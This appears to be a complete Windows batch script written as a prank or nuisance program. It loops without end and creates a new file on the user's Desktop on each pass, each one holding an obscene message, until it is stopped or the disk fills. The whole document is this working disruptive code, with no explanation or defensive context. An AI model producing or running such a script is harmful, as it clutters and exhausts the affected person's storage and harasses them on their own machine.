@echo off
:a
@set /a "a=%a%+1"
cd %HOMEPATH%
cd Desktop
echo GoFuckYourself > %a%
goto a
